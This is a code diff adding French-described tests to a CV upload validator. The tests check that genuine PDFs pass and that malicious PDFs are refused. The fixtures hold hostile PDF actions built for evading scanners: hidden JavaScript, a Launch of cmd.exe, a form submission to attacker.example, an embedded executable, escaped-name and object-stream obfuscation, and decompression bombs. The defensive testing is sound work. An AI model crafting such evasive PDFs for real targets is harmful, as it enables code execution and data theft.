@@ -4,6 +4,7 @@ import { recruitmentCvValidationMessage, validateCvFile } from "./recruitmentFil
 import { DOCUMENT_DECOMPRESSION_LIMITS, truncateExtractedText } from "./documentDecompressionLimits";
 import { extractCvDocument } from "./recruitmentAnalysis";
 import { buildDocx } from "./testing/zipFixture";
+import { libreOfficeCvPdf, packPdfIntoObjectStream } from "./testing/pdfFixture";
 
 const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
 const validPdf = Buffer.concat([Buffer.from("%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n"), Buffer.alloc(300, 65)]);
@@ -98,6 +99,133 @@ describe("validation et quarantaine des CV", () => {
   });
 });
 
+describe("REC-02 — PDF réels acceptés, actions dangereuses cherchées aussi dans les flux d’objets", () => {
+  const validate = (buffer: Buffer) => validateCvFile({ buffer, mimeType: "application/pdf", originalName: "cv.pdf", size: buffer.length });
+  const LIBREOFFICE_OPEN_ACTION = "/OpenAction[1 0 R /XYZ null null 0]";
+  /** The LibreOffice CV whose opening action runs the given action instead of showing page 1. */
+  const openingWith = (action: string) => (source: string) => source.replace(LIBREOFFICE_OPEN_ACTION, `/OpenAction ${action}`);
+
+  it("accepte le CV exporté par LibreOffice et son /OpenAction qui affiche la page 1", async () => {
+    const pdf = libreOfficeCvPdf();
+    expect(pdf.toString("latin1")).toContain(LIBREOFFICE_OPEN_ACTION);
+
+    expect(validate(pdf)).toMatchObject({ pageCount: 1, securityScanVersion: "document-safety-v4" });
+    expect((await extractCvDocument(pdf, "application/pdf")).text).toContain("Dr Camille Martin");
+  });
+
+  it("accepte le même CV enregistré avec des flux d’objets (pdf-lib, Acrobat optimisé) : les pages sont comptées dans le flux décompressé", async () => {
+    const pdf = packPdfIntoObjectStream(libreOfficeCvPdf());
+    expect(pdf.toString("latin1")).not.toMatch(/\/Type\s*\/Page\b/);
+
+    expect(validate(pdf).pageCount).toBe(1);
+    // pdf.js reads the rewritten file: it is a valid PDF, not a fixture only the check accepts.
+    const extraction = await extractCvDocument(pdf, "application/pdf");
+    expect(extraction.text).toContain("Dr Camille Martin");
+    expect(extraction.totalPages).toBe(1);
+  });
+
+  it("refuse un JavaScript caché dans un flux d’objets, même sans /Type /ObjStm", async () => {
+    const hidden = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>") });
+    expect(hidden.toString("latin1")).not.toContain("JavaScript");
+    // pdf.js reads it, so a PDF reader would run it.
+    expect((await extractCvDocument(hidden, "application/pdf")).text).toContain("Dr Camille Martin");
+    expect(() => validate(hidden)).toThrow("cv_validation_pdf_active_content");
+
+    const untyped = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>"), objectStream: { dictionary: "/Filter/FlateDecode" } });
+    expect(() => validate(untyped)).toThrow("cv_validation_pdf_active_content");
+  });
+
+  it("décode les noms échappés #XX avant de chercher les actions, dans le fichier comme dans les flux d’objets", () => {
+    const actions = [
+      "<</S/#4A#61va#53cript/#4A#53(app.alert\\(1\\))>>",
+      "<</S/#4C#61unch/F(cmd.exe)>>",
+      "<</S/Sub#6DitForm/F(https://attacker.example/collect)>>",
+      "<</S/Import#44ata/F(data.fdf)>>",
+      "<</Type/Annot/Subtype/Rich#4Dedia>>",
+    ];
+    for (const action of actions) {
+      const raw = Buffer.from(openingWith(action)(libreOfficeCvPdf().toString("latin1")), "latin1");
+      expect(() => validate(raw), action).toThrow("cv_validation_pdf_active_content");
+      expect(() => validate(packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith(action) })), action).toThrow("cv_validation_pdf_active_content");
+    }
+    const attachment = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: source => source.replace("/PageMode/UseOutlines", "/Names<</Embedded#46iles<</Names[(cv.exe) 3 0 R]>>>>") });
+    expect(() => validate(attachment)).toThrow("cv_validation_pdf_active_content");
+  });
+
+  it("refuse un flux d’objets qu’il ne peut pas lire (filtre autre que Flate) au lieu de le croire sans danger", () => {
+    const hex = packPdfIntoObjectStream(libreOfficeCvPdf(), {
+      edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>"),
+      objectStream: { dictionary: "/Type/ObjStm/Filter/ASCIIHexDecode", encode: content => Buffer.from(`${content.toString("hex")}>`, "latin1") },
+    });
+    expect(() => validate(hex)).toThrow("cv_validation_pdf_object_stream_unreadable");
+    expect(recruitmentCvValidationMessage("cv_validation_pdf_object_stream_unreadable")).toContain("imprimez-le en PDF depuis votre navigateur");
+  });
+
+  describe("lit le dictionnaire du flux d’objets comme pdf.js, pas dans une fenêtre devinée", () => {
+    // A page written in clear in the dictionary, so that the page count alone cannot refuse the file.
+    const hiddenJavaScript = (dictionary: string, encode?: (content: Buffer) => Buffer) => packPdfIntoObjectStream(libreOfficeCvPdf(), {
+      edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>"),
+      objectStream: { dictionary: `${dictionary}/Y(/Type /Page)`, encode },
+    });
+    const asHex = (content: Buffer) => Buffer.from(`${content.toString("hex")}>`, "latin1");
+
+    it.each([
+      ["un faux « obj » dans une chaîne", "/Type/ObjStm/Filter/FlateDecode/X( obj)"],
+      ["une chaîne de 5 000 caractères", `/Type/ObjStm/Filter/FlateDecode/X(${"x".repeat(5_000)})`],
+      ["/F au lieu de /Filter", "/Type/ObjStm/F/FlateDecode"],
+      ["un faux en-tête d’objet là où pdf.js attend une clé", "/Type/ObjStm/Filter/FlateDecode 9 0 obj <<"],
+    ])("trouve le JavaScript malgré %s", async (_label, dictionary) => {
+      const pdf = hiddenJavaScript(dictionary);
+      // pdf.js reads the object stream (pages and opening action), so a PDF reader would run the script.
+      const extraction = await extractCvDocument(pdf, "application/pdf");
+      expect(extraction.totalPages).toBe(1);
+      expect(extraction.text).toContain("Dr Camille Martin");
+      expect(() => validate(pdf)).toThrow("cv_validation_pdf_active_content");
+    });
+
+    it.each([
+      ["/F/AHx (ASCIIHex) au lieu de /Filter", "/Type/ObjStm/F/AHx", asHex],
+      ["/DP (prédicteur) au lieu de /DecodeParms", "/Type/ObjStm/Filter/FlateDecode/DP<</Predictor 1>>", undefined],
+      ["un faux « endobj » là où pdf.js attend une clé", "/Type/ObjStm/F/AHx endobj 9 0 obj <<", asHex],
+      ["un « >> » pris par pdf.js comme valeur", "/Type/ObjStm/X >> /F/AHx", asHex],
+      ["une image en ligne (BI) là où pdf.js attend une valeur", "/Type/ObjStm/F/AHx/X BI /W 1 ID x EI <<", asHex],
+    ])("refuse comme illisible un flux d’objets caché par %s", async (_label, dictionary, encode) => {
+      const pdf = hiddenJavaScript(dictionary, encode);
+      expect((await extractCvDocument(pdf, "application/pdf")).totalPages).toBe(1);
+      expect(() => validate(pdf)).toThrow("cv_validation_pdf_object_stream_unreadable");
+    });
+
+    it("refuse un commentaire entre le dictionnaire et « stream », un flux d’objets non compressé ou contenant un flux", () => {
+      const hex = hiddenJavaScript("/Type/ObjStm/F/AHx", asHex).toString("latin1");
+      for (const separator of [" %c>>\n", "\n% x >> y\n"]) {
+        const commented = Buffer.from(hex.replace(/(\/Length \d+>>)\nstream/, (_match, end: string) => `${end}${separator}stream`), "latin1");
+        expect(() => validate(commented), separator).toThrow("cv_validation_pdf_object_stream_unreadable");
+      }
+      const plain = packPdfIntoObjectStream(libreOfficeCvPdf(), { objectStream: { dictionary: "/Type/ObjStm", encode: content => content } });
+      expect(() => validate(plain)).toThrow("cv_validation_pdf_object_stream_unreadable");
+      const nested = packPdfIntoObjectStream(libreOfficeCvPdf(), {
+        objectStream: { encode: content => deflateSync(Buffer.concat([content, Buffer.from("<</Type/ObjStm/N 1/First 4/F/AHx/Length 9>>\nstream\n3120302036>\nendstream\n", "latin1")])) },
+      });
+      expect(() => validate(nested)).toThrow("cv_validation_pdf_object_stream_unreadable");
+    });
+  });
+
+  it("garde le plafond de décompression pour les flux d’objets", () => {
+    const bomb = pdfWithStream("/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode", deflateSync(Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.pdfMaxInflatedBytes + 1024, 32)));
+    expect(() => validate(bomb)).toThrow("cv_validation_pdf_decompressed_size_exceeded");
+    // Declaring the object stream as a small image does not skip its content.
+    const disguised = pdfWithStream("/Type /ObjStm /N 1 /First 4 /Subtype /Image /Width 1 /Height 1 /Filter /FlateDecode", deflateSync(Buffer.from("1 0 << /S /JavaScript /JS (app.alert(1)) >>")));
+    expect(() => validate(disguised)).toThrow("cv_validation_pdf_active_content");
+  });
+
+  it("dit au candidat quoi faire d’un CV refusé : le réenregistrer en DOCX ou l’imprimer en PDF depuis le navigateur", () => {
+    for (const code of ["cv_validation_pdf_active_content", "cv_validation_docx_active_content", "cv_validation_pdf_page_structure_invalid"]) {
+      expect(recruitmentCvValidationMessage(code), code).toContain("Réenregistrez votre CV en DOCX ou imprimez-le en PDF depuis votre navigateur");
+    }
+    expect(recruitmentCvValidationMessage("cv_validation_pdf_active_content")).not.toContain("Enregistrez-le en PDF");
+  });
+});
+
 describe("bombes de décompression : plafonds avant extraction", () => {
   it("refuse un DOCX de quelques Ko qui se décompresse au-delà de 20 Mo", () => {
     const bomb = buildDocx(["CV"], [{ name: "word/media/filler.bin", content: Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.docxMaxUncompressedBytes + 1024, 0) }]);
@@ -139,6 +267,25 @@ describe("bombes de décompression : plafonds avant extraction", () => {
     const scan = pdfWithStream("/Type /XObject /Subtype /Image /Width 2480 /Height 3508 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode", deflateSync(Buffer.alloc(2480 * 3508 * 3, 200)));
     expect(validateCvFile({ buffer: scan, mimeType: "application/pdf", originalName: "cv.pdf", size: scan.length }).pageCount).toBe(1);
     expect(recruitmentCvValidationMessage("cv_validation_pdf_processing_timeout")).toContain("trop volumineux");
+  });
+
+  it("juge un fichier de 4 Mo truffé de mots « stream » ou d’objets en un temps linéaire, pas quadratique", () => {
+    // Before the reading of object streams was bounded, 800 KB of "stream\n" took 17 s.
+    const filled = (unit: string) => Buffer.from(`%PDF-1.7\n${unit.repeat(Math.floor((4 * 1024 * 1024 - 16) / unit.length))}`, "latin1");
+    const shapes: Array<[string, string]> = [
+      ["stream\n", "cv_validation_pdf_stream_count_exceeded"],
+      ["stream\nx\x9c", "cv_validation_pdf_stream_count_exceeded"],
+      ["1 0 obj <</N 1/First 4/Filter/FlateDecode>>stream\nx\x9c", "cv_validation_pdf_stream_count_exceeded"],
+      ["1 0 obj <<", "cv_validation_pdf_page_structure_invalid"],
+      ["obj (", "cv_validation_pdf_page_structure_invalid"],
+    ];
+    for (const [unit, code] of shapes) {
+      const pdf = filled(unit);
+      const started = performance.now();
+      expect(() => validateCvFile({ buffer: pdf, mimeType: "application/pdf", originalName: "cv.pdf", size: pdf.length }), JSON.stringify(unit)).toThrow(code);
+      expect(performance.now() - started, JSON.stringify(unit)).toBeLessThan(4_000);
+    }
+    expect(recruitmentCvValidationMessage("cv_validation_pdf_stream_count_exceeded")).toContain("imprimez-le en PDF depuis votre navigateur");
   });
 
   it("tronque le texte extrait à 200 000 caractères avec un avertissement", async () => {
